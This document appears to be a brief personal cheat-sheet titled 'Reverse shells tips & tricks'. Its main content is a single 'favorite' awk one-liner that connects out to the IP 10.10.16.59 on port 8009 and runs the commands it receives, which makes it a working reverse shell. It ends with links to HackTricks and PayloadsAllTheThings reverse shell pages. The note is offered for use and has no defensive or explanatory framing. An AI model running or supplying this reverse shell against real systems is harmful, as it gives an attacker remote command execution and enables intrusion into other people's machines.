# Reverse shells tips & tricks

## Favorite:
```
awk 'BEGIN {s = "/inet/tcp/0/10.10.16.59/8009"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
222

https://book.hacktricks.xyz/shells/shells/windows
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md